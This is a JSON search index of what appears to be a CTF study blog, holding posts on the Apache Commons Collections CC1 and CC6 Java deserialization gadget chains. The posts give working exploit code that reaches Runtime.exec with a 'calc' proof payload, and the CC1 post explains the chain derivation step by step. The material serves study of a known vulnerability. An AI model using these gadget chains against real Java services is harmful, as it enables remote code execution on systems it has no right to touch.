[{"title":"CC6","url":"/2025/10/30/CC6/","content":"\nqweqweqwe\n\n# Preface\n\n- URLDNS链\n- CC1\n\n# Code\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.HashedMap;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.map.TransformedMap;\nimport org.junit.Test;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.annotation.Retention;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC6 {\n    @Test\n    public void CC1() {\n        try{\n            InvokerTransformer invokerTransformer = new InvokerTransformer(\n                    \"exec\",\n                    new Class[]{String.class},\n                    new Object[]{\"calc\"}\n            );\n            Transformer[] transformers = new Transformer[]{\n                    new ConstantTransformer(Runtime.class),\n                    new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}),\n                    new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}),\n                    invokerTransformer\n            };\n            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n            HashedMap map = new HashedMap();\n            Map<Object,Object> transformedmap = TransformedMap.decorate(map,null,chainedTransformer);\n            map.put(\"value\", \"b\");\n\n            Class c_AnnotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n            Constructor constructor = c_AnnotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);\n            constructor.setAccessible(true);\n            Object o = constructor.newInstance(Retention.class,transformedmap);\n\n            serialize(o);\n            unserialize(\"D:\\\\Download\\\\CC\\\\c6\\\\cc6\\\\cc1.txt\");\n        }catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n\n\n    /*\n    chain:\n    HahsMap.readObject()\n    HashMap.put()\n    HashMap.hash()\n        TiedMapEntry.hashCode()\n        TiedMapEntry.getValue()\n            LazyMap.get()\n                ChainedTransformer.transform()\n                    InvokerTransformer.transform()\n                        Runtime.exec()\n     */\n    @Test\n    public void cc6_hashcode() {\n        try{\n            InvokerTransformer invokerTransformer = new InvokerTransformer(\n                    \"exec\",\n                    new Class[]{String.class},\n                    new Object[]{\"calc\"}\n            );\n            Transformer[] transformers = new Transformer[]{\n                    new ConstantTransformer(Runtime.class),\n                    new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}),\n                    new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}),\n                    invokerTransformer\n            };\n            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n\n            Map decorate = LazyMap.decorate(new HashedMap(), chainedTransformer);\n\n            TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,null);\n\n            tiedMapEntry.hashCode();\n\n\n        }catch (Exception e) {e.printStackTrace();}\n    }\n\n    @Test\n    public void cc6_put(){\n        try {\n            InvokerTransformer invokerTransformer = new InvokerTransformer(\n                    \"exec\",\n                    new Class[]{String.class},\n                    new Object[]{\"calc\"}\n            );\n            Transformer[] transformers = new Transformer[]{\n                    new ConstantTransformer(Runtime.class),\n                    new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}),\n                    new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}),\n                    invokerTransformer\n            };\n            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n\n            Map decorate = LazyMap.decorate(new HashedMap(), chainedTransformer);\n\n            TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,null);\n\n            HashMap<Object,Object> hashMap = new HashMap();\n            hashMap.put(tiedMapEntry,\"1\");\n            /*\n            put会提前调用链，导致我们无法通过反序列化的readObject弹calc\n             */\n\n\n        }catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Test\n    public void cc6(){\n        try {\n            InvokerTransformer invokerTransformer = new InvokerTransformer(\n                    \"exec\",\n                    new Class[]{String.class},\n                    new Object[]{\"calc\"}\n            );\n            Transformer[] transformers = new Transformer[]{\n                    new ConstantTransformer(Runtime.class),\n                    new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}),\n                    new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}),\n                    invokerTransformer\n            };\n            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n\n            Map map = LazyMap.decorate(new HashedMap(), new ConstantTransformer(000));\n\n            TiedMapEntry tiedMapEntry = new TiedMapEntry(map,\"333\");\n            HashMap<Object,Object> hashMap = new HashMap();\n            hashMap.put(tiedMapEntry,\"222\");\n            map.remove(\"333\");\n\n\n            Class<LazyMap> lazyMapClass = LazyMap.class;\n            Field f = lazyMapClass.getDeclaredField(\"factory\");\n            f.setAccessible(true);\n            f.set(map,chainedTransformer);\n\n            serialize(hashMap);\n            unserialize(\"D:\\\\Download\\\\CC\\\\c6\\\\cc6\\\\cc1.txt\");\n\n\n        }catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    //定义序列化方法\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(\"D:\\\\Download\\\\CC\\\\c6\\\\cc6\\\\cc1.txt\"));\n        oos.writeObject(object);\n    }\n\n    //定义反序列化方法\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream(filename));\n        objectInputStream.readObject();\n    }\n}\n```\n\n#\tReference\n\n- https://www.freebuf.com/articles/web/336628.html\n- https://blog.csdn.net/qq_61237064/article/details/127562419\n- https://drun1baby.top/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/\n- https://www.cnblogs.com/CVE-Lemon/p/17935937.html\n","tags":["CC6"]},{"title":"CC1","url":"/2025/10/27/CC1/","content":"\n# 前言：\n\n涉及知识：Java反射、Java SE和Java EE\n\n环境搭建可以看结尾参考的文章。\n\n这里写篇CC只是为了记录一下Java题目，为后面的Wp做准备，所以除了WP不会写的太详细。\n\n# 思路代码更迭\n\n具体操作步骤不附图了。有点麻烦。\n\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.HashedMap;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.*;\nimport java.lang.annotation.Repeatable;\nimport java.lang.annotation.Retention;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\nimport java.util.Map;\n\npublic class CC1 {\n    public static void main(String[] args) {\n        try{\n            //原生弹calc\n//            Runtime r = Runtime.getRuntime();\n//            r.exec(\"calc\");\n//=========================================================\n\n            //反射弹calc\n              //part1:这里由于在Runtime类当中，Runtime类的构造器是私有（private）的\n              //      所以要使用Runtime类的getRuntime获取实例。\n//            Class c1 = Class.forName(\"java.lang.Runtime\");\n//            Object o1 = c1.newInstance();\n//            Method m1 = c1.getMethod(\"exec\", String.class);\n//            m1.invoke(c1,\"calc\");\n\n            //part2: 在某些情况下会被 SecurityManager 拦截抛出 SecurityException异常\n//            Constructor<Runtime> ctor = Runtime.class.getDeclaredConstructor();\n//            ctor.setAccessible(true); // 绕过 private\n//            Runtime runtime = ctor.newInstance();\n//            runtime.exec(\"calc\");\n\n\n              //part3:使用getRuntime正确获取实例。原型：Runtime.getRuntime().exec(\"calc\");\n//            Class c1 = Class.forName(\"java.lang.Runtime\");\n//            Method getRuntimeMethod = c1.getMethod(\"getRuntime\");\n//            Object Runtime = getRuntimeMethod.invoke(c1);\n//            Method m = c1.getMethod(\"exec\", String.class);\n//            m.invoke(Runtime,\"calc\");\n//==========================================================\n\n            /*\n            在org.apache.commons.collections.Transformer;的Transformer当中有transform方法。\n            ctrl+b查找那个类重写了transforme，发现InvokerTransformer类重写了。\n            为什么要找这个类？因为这里使用反射执行了任意方法调用，类似后门。\n            关键代码如下：\n                Class cls = input.getClass();\n                Method method = cls.getMethod(iMethodName, iParamTypes);\n                return method.invoke(input, iArgs);\n             向上查找发现有三个参数可控：\n                public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {\n                    super();\n                    iMethodName = methodName;\n                    iParamTypes = paramTypes;\n                    iArgs = args;\n                }\n             */\n            //使用InvokerTransformer内的invoke弹calc。接下来ALT+F7查找谁有哪些同名transform方法\n//            InvokerTransformer invokerTransformer = new InvokerTransformer(\n//                    \"exec\",\n//                    new Class[]{String.class},\n//                    new Object[]{\"calc\"});\n//            invokerTransformer.transform(Runtime.getRuntime());\n//==========================================================\n            /*\n            查找到TransformedMap类下的checkSetValue方法当中调用了transform（优先查找在readObject方法下的）\n            为什么查找transform？因为我们构造的链子是类似于重写，通过方法的重写得到最终的readObject\n            关键代码：\n                protected Object checkSetValue(Object value) {\n                    return valueTransformer.transform(value);\n                }\n            1.我们既然要让他类似重写，那么我们将valueTransformer改为invockerTransformer。\n            2.我们要调用checkSetValue并传参数Runtime.getRuntime()\n            先解决1，我们找valueTransformer的设置器\n                protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {\n                    super(map);\n                    this.keyTransformer = keyTransformer;\n                    this.valueTransformer = valueTransformer;\n                }\n            我们可以调用TransformedMap对valueTransformer赋值，\n            但是这个TransformedMap方法被protected修饰，那么他会被这个TransformedMap类内实例化，向上找TransformedMap\n                public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {\n                    return new TransformedMap(map, keyTransformer, valueTransformer);\n                }\n            我们可以调用被public修饰的decorate方法给valueTransformer赋值，这会返回实例化一个TransformedMap方法，并且在之后会进行赋值。\n            1.解决了，现在解决2.\n            ALT+F7查找checkSetValue被谁调用，发现在AbstractInputCheckedMapDecorator方法当中的setValue方法内调用（这里是TransformedMap类extends了AbstractInputCheckedMapDecorator类，所以会调用这个类的setValue方法内的checkSetValue）\n            这个setValue是被public修饰可以直接调用，那么怎样调用这个setvalue呢？\n            MapEntry方法extends了AbstractMapEntryDecorator类，而AbstractMapEntryDecorator类implements了Map.Entry，所以，我们在进行Map遍历的时候就可以调用setValue并将参数传进去。\n            由于最终AbstractMapEntryDecorator类当中setValue被调用时的参数类型是Object，所以我们Map也必须是Object类型\n                public Object setValue(Object object) {\n                    return entry.setValue(object);\n                }\n             */\n\n//            InvokerTransformer invokerTransformer = new InvokerTransformer(\n//                    \"exec\",\n//                    new Class[]{String.class},\n//                    new Object[]{\"calc\"});\n////            invokerTransformer.transform(Runtime.getRuntime());\n//            Runtime runtime = Runtime.getRuntime();\n//            HashedMap map = new HashedMap();\n//            Map<Object,Object> transformedmap = TransformedMap.decorate(map,null,invokerTransformer);\n//            map.put(\"a\",\"b\");\n//            for (Map.Entry<Object,Object> entry : transformedmap.entrySet()) {\n//                entry.setValue(runtime);\n//            }\n//==========================================================\n\n            /*\n            ALT+F7查找哪些类内的方法与setValue重名（还是优先找readObject方法下）\n            AnnotationInvocationHandler类下正好有readObject方法并调用了setValue，那么这里就是链子最终的地方。\n            先弄序列化和反序列化方法进去。\n            关键代码如下：\n    private void readObject(java.io.ObjectInputStream s)\n        throws java.io.IOException, ClassNotFoundException {\n        s.defaultReadObject();\n\n        // Check to make sure that types have not evolved incompatibly\n\n        AnnotationType annotationType = null;\n        try {\n            annotationType = AnnotationType.getInstance(type);\n        } catch(IllegalArgumentException e) {\n            // Class is no longer an annotation type; time to punch out\n            throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\");\n        }\n\n        Map<String, Class<?>> memberTypes = annotationType.memberTypes();\n\n        // If there are annotation members without values, that\n        // situation is handled by the invoke method.\n        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {\n            String name = memberValue.getKey();\n            Class<?> memberType = memberTypes.get(name);\n            if (memberType != null) {  // i.e. member still exists\n                Object value = memberValue.getValue();\n                if (!(memberType.isInstance(value) ||\n                      value instanceof ExceptionProxy)) {\n                    memberValue.setValue(\n                        new AnnotationTypeMismatchExceptionProxy(\n                            value.getClass() + \"[\" + value + \"]\").setMember(\n                                annotationType.members().get(name)));\n                }\n            }\n        }\n    }\n            这里发现setValue由内到外被if-if-for包裹，所以这里要满足两个if并且至少执行一次for循环。那么我们由外到内逐一解决。\n                for要执行一次，那么memberValues不为null，向上找其构造器。\n    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {\n        Class<?>[] superInterfaces = type.getInterfaces();\n        if (!type.isAnnotation() ||\n            superInterfaces.length != 1 ||\n            superInterfaces[0] != java.lang.annotation.Annotation.class)\n            throw new AnnotationFormatError(\"Attempt to create proxy for a non-annotation type.\");\n        this.type = type;\n        this.memberValues = memberValues;\n    }\n            AnnotationInvocationHandler方法实现了memberValues赋值，我们可进行调用进行赋值，但是这个AnnotationInvocationHandler类没有被任何修饰符修饰，我们无法AnnotationInvocationHandler.AnnotationInvocationHandler(...)进行调用，只能在package sun.reflect.annotation;进行包内调用\n            但是我们可以通过反射调用。\n                参数memberValues弄好之后就是第一个if，memberType不为空即可进入，调试发现annotationType = AnnotationType.getInstance(type);     type:\"interface java.Lang.Override\"\n            type:\"interface java.Lang.Override\"是我们传进去的Override.class，跟进发现public @interface Override {}为空，不可进入if，查找其他Annotation注解，Target、Retention、Repeatable都可以\n                第二个if在调试的时候直接进入了\n            if-if-for绕过之后执行，发现没有弹出calc，调试发现Runtime.getRuntime()没有被传进去，原因是在AnnotationInvocationHandler最后的setValue传进去的参数是固定的，我们无法控制，怎么办？凉拌炒鸡蛋\n             */\n\n//            InvokerTransformer invokerTransformer = new InvokerTransformer(\n//                    \"exec\",\n//                    new Class[]{String.class},\n//                    new Object[]{\"calc\"});\n////            invokerTransformer.transform(Runtime.getRuntime());\n//            Runtime runtime = Runtime.getRuntime();\n//            HashedMap map = new HashedMap();\n//            Map<Object,Object> transformedmap = TransformedMap.decorate(map,null,invokerTransformer);\n//            map.put(\"value\",\"b\");\n////            for (Map.Entry<Object,Object> entry : transformedmap.entrySet()) {\n////                entry.setValue(runtime);\n////            }\n//            Class c_AnnotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n//            Constructor cons_AnnotationInvocationHandler = c_AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);\n//            cons_AnnotationInvocationHandler.setAccessible(true);\n//            Object o = cons_AnnotationInvocationHandler.newInstance(Retention.class, transformedmap);//其他文章用的Target注解，但是我发现Retention和Repeatable注解当中都有value，所以我采用了Retention\n//\n//            serialize(o);\n//            unserialize(\"D:\\\\Download\\\\CC\\\\c1\\\\cc1.txt\");\n//==========================================================\n\n            /*\n            在上一步的代码当中我们的参数会在AnnotationInvocationHandler类最后的setValue固定，导致我们在TransformedMap类的value不是Runtime.getRuntime().\n            protected Object checkSetValue(Object value) {\n                    return valueTransformer.transform(value);\n            }\n            如果有一种东西（这里称为x，x当中含有.transform(value2)），x.tansform(value)当中的tansform(value)没有用，value可以为任意东西，返回的是x当中的transform(value2),那不是同样可以调用invokerTransformer吗？\n            这种东西确实存在就是ChainedTransformer类下的ChainedTransformer方法和transform方法\n                        public class ChainedTransformer implements Transformer, Serializable {\n                            public ChainedTransformer(Transformer[] transformers) {\n                                super();\n                                iTransformers = transformers;\n                            }\n                            public Object transform(Object object) {\n                                for (int i = 0; i < iTransformers.length; i++) {\n                                    object = iTransformers[i].transform(object);\n                                }\n                                return object;\n                            }\n                        }\n\n            */\n//            Runtime runtime = Runtime.getRuntime();\n//            ConstantTransformer constantTransformer = new ConstantTransformer(runtime);\n//            InvokerTransformer invokerTransformer = new InvokerTransformer(\n//                    \"exec\",\n//                    new Class[]{String.class},\n//                    new Object[]{\"calc\"});\n//            ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{\n//                    constantTransformer,\n//                    invokerTransformer\n//            });\n//\n//            HashedMap map = new HashedMap();\n//            Map<Object,Object> transformedmap = TransformedMap.decorate(map,null,chainedTransformer);\n//            map.put(\"value\",\"b\");\n//            Class c_AnnotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n//            Constructor cons_AnnotationInvocationHandler = c_AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);\n//            cons_AnnotationInvocationHandler.setAccessible(true);\n//            Object o = cons_AnnotationInvocationHandler.newInstance(Retention.class, transformedmap);//其他文章用的Target注解，但是我发现Retention和Repeatable注解当中都有value，所以我采用了Retention\n//\n//            serialize(o);\n//            unserialize(\"D:\\\\Download\\\\CC\\\\c1\\\\cc1.txt\");\n//==========================================================\n            /*\n            最后发现java.io.NotSerializableException: java.lang.Runtime\n            Runtime无法被序列化，因为Runtime没有实现序列化接口，那么我们通过我们最上面写道Runtime反射调用calc的代码\n                Class c1 = Class.forName(\"java.lang.Runtime\");\n                Method getRuntimeMethod = c1.getMethod(\"getRuntime\");\n                Object Runtime = getRuntimeMethod.invoke(c1);\n                Method m = c1.getMethod(\"exec\", String.class);\n                m.invoke(Runtime,\"calc\");\n            将其修改\n            ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{\n                    constantTransformer,\n                    invokerTransformer\n            });\n            为我们的反射Runtime调用calc的代码\n             */\n\n//            Runtime runtime = Runtime.getRuntime();\n//            ConstantTransformer constantTransformer = new ConstantTransformer(runtime);\n//            InvokerTransformer invokerTransformer = new InvokerTransformer(\n//                    \"exec\",\n//                    new Class[]{String.class},\n//                    new Object[]{\"calc\"});\n\n            Transformer[] transformers = new Transformer[]{\n//                    constantTransformer,\n//                    invokerTransformer\n                    new ConstantTransformer(Runtime.class),\n                    new InvokerTransformer(\"getDeclaredMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}),\n                    new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}),\n                    new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}),\n            };\n            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n            HashedMap map = new HashedMap();\n            map.put(\"value\",\"value\");\n            Map<Object,Object> transformedmap = TransformedMap.decorate(map,null,chainedTransformer);\n\n            Class c_AnnotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n            Constructor cons_AnnotationInvocationHandler = c_AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);\n            cons_AnnotationInvocationHandler.setAccessible(true);\n            Object o = cons_AnnotationInvocationHandler.newInstance(Retention.class, transformedmap);//其他文章用的Target注解，但是我发现Retention和Repeatable注解当中都有value，所以我采用了Retention\n\n            serialize(o);\n            unserialize(\"D:\\\\Download\\\\CC\\\\c1\\\\cc1.txt\");\n\n        }catch (Exception e){e.printStackTrace();}\n    }\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(\"D:\\\\Download\\\\CC\\\\c1\\\\cc1.txt\"));\n        oos.writeObject(object);\n    }\n\n    //定义反序列化方法\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream(filename));\n        objectInputStream.readObject();\n    }\n}\n\n```\n\n# 参考\n\n\n- 反射\n  - https://xz.aliyun.com/news/8621\n  - https://xz.aliyun.com/news/6625#toc-0\n- CC1\n  \n  - https://blog.csdn.net/weixin_49047967/article/details/134763883\n  - https://xz.aliyun.com/news/12115\n  - https://www.freebuf.com/articles/web/410767.html\n  - 视频：\n    - https://www.bilibili.com/video/BV1A1421q7zj/?spm_id_from=333.337.search-card.all.click&vd_source=1602c1287f78f4bb7a0ff844ebc8dc41\n    - https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.337.search-card.all.click&vd_source=1602c1287f78f4bb7a0ff844ebc8dc41\n","tags":["Java CC"]},{"title":"new one","url":"/2025/10/19/hello-world/","content":"\n# old blog\n\nold blog纯粹是摸索，记录的都是自己对于ctf的web和小部分pwn的探索。\n\n# new blog\n\nnew blog针对于各种ctf比赛的wp、CVE以及学习进行记录，不再记录知识点。\n"},{"title":"about","url":"/about/index.html"},{"title":"tags","url":"/tags/index.html"},{"title":"categories","url":"/categories/index.html"}]